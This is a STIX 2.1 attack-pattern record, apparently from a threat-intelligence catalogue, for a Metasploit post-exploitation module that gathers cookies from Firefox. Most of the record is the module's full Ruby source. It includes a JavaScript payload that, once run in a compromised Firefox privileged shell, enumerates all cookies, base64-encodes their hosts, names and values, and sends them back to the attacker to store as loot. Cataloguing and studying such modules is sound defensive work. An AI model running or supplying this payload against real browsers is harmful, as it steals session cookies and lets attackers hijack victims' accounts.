{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--a61a7671-028b-43e8-8bb3-830b8a9401bc",
    "created": "2024-08-14T16:33:13.575403Z",
    "modified": "2024-08-14T16:33:13.575407Z",
    "name": "Firefox Gather Cookies from Privileged Javascript Shell",
    "description": " This module allows collection of cookies from a Firefox Privileged Javascript Shell.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/firefox/gather/cookies.rb",
            "external_id": "cookies.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'json'\n\nclass MetasploitModule < Msf::Post\n  include Msf::Exploit::Remote::FirefoxPrivilegeEscalation\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Firefox Gather Cookies from Privileged Javascript Shell',\n        'Description' => %q{\n          This module allows collection of cookies from a Firefox Privileged Javascript Shell.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [ 'joev' ],\n        'DisclosureDate' => '2014-03-26'\n      )\n    )\n\n    register_options([\n      OptInt.new('TIMEOUT', [true, 'Maximum time (seconds) to wait for a response', 90])\n    ])\n  end\n\n  def run\n    results = js_exec(js_payload)\n    if results.present?\n      begin\n        cookies = JSON.parse(results)\n        cookies.each do |entry|\n          entry.each_key { |k| entry[k] = Rex::Text.decode_base64(entry[k]) }\n        end\n\n        file = store_loot('firefox.cookies.json', 'text/json', rhost, results)\n        print_good(\"Saved #{cookies.length} cookies to #{file}\")\n      rescue JSON::ParserError => e\n        print_warning(results)\n      end\n    end\n  end\n\n  def js_payload\n    %|\n      (function(send){\n        try {\n          var b64 = Components.utils.import(\"resource://gre/modules/Services.jsm\").btoa;\n          var cookieManager = Components.classes[\"@mozilla.org/cookiemanager;1\"]\n                        .getService(Components.interfaces.nsICookieManager);\n          var cookies = [];\n          var iter = cookieManager.enumerator;\n          while (iter.hasMoreElements()){\n            var cookie = iter.getNext();\n            if (cookie instanceof Components.interfaces.nsICookie){\n              cookies.push({host:b64(cookie.host), name:b64(cookie.name), value:b64(cookie.value)})\n            }\n          }\n          send(JSON.stringify(cookies));\n        } catch (e) {\n          send(e);\n        }\n      })(this.send);\n    |.strip\n  end\nend\n",
    "x_mitre_disclosure_date": "2014-03-26"
}